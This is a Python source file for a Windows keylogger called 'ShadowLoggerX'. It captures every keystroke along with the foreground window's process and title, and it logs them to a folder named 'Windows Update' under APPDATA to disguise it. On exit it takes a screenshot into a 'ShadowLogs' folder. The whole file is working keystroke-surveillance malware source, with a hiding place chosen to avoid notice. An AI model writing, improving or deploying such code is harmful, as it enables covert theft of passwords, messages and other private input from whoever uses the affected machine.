import os
import pyautogui
import time
import threading
import win32gui
import win32process
import psutil
from datetime import datetime
from pynput import keyboard

# ─── Setup ─────────────────────────────────────────────────────────────
appdata = os.getenv('APPDATA')
if not appdata:
    print("ERROR: APPDATA environment variable not found.")
    exit(1)

today = datetime.now().strftime("%Y-%m-%d")
log_folder = os.path.join(appdata, "Windows Update")
roaming_folder = os.path.join(appdata, "ShadowLogs")

os.makedirs(log_folder, exist_ok=True)
os.makedirs(roaming_folder, exist_ok=True)

log_file = os.path.join(log_folder, f"{today}.log")
last_window = None
buffer = ''

# ─── Utilities ─────────────────────────────────────────────────────────
def write_log(content):
    with open(log_file, "a", encoding="utf-8", errors="replace") as f:
        f.write(content)

def get_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        title = win32gui.GetWindowText(hwnd)
        return f"{process.name()} - {title}"
    except Exception:
        return "Unknown Window"

# ─── Key Press Handler ─────────────────────────────────────────────────
def on_press(key):
    global buffer, last_window
    curr_window = get_window()
    if curr_window != last_window:
        last_window = curr_window
        timestamp_str = datetime.now().strftime('%H:%M:%S')
        write_log(f"\n⏺️ [{curr_window} - {timestamp_str}]\n")

    try:
        if key == keyboard.Key.backspace:
            buffer = buffer[:-1]
        elif key == keyboard.Key.space:
            buffer += ' '
        elif key == keyboard.Key.enter:
            buffer += '\n'
            write_log(buffer)
            buffer = ''
        elif hasattr(key, 'char') and key.char is not None:
            buffer += key.char
    except Exception as e:
        print(f"[ERROR] Key processing error: {e}")

# ─── Key Release Handler ───────────────────────────────────────────────
def on_release(key):
    global buffer
    if key == keyboard.Key.esc:
        # Save screenshot
        try:
            img = pyautogui.screenshot()
            img.save(os.path.join(roaming_folder, f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}_exit.png'))
        except Exception as e:
            print(f"[ERROR] Screenshot failed: {e}")

        # Flush remaining buffer and write session end
        if buffer.strip():
            write_log(buffer + '\n')
        write_log("\n╔════════════════════════════════════════════════════════════════════════════╗\n")
        write_log(f"║                        [ SESSION ENDED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ]             ║\n")
        write_log("╚════════════════════════════════════════════════════════════════════════════╝\n")
        return False

# ─── Main Entry ────────────────────────────────────────────────────────
def __main__():
    print("ShadowLoggerX is running...")
    print(f"Logs will be saved to: {log_file}")
    print("Press ESC to stop logging.")

    write_log("\n╔════════════════════════════════════════════════════════════════════════════╗\n")
    write_log(f"║                        [ SESSION STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ]           ║\n")
    write_log("╚════════════════════════════════════════════════════════════════════════════╝\n")

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("Logging interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Listener failed: {e}")

if __name__ == "__main__":
    __main__()
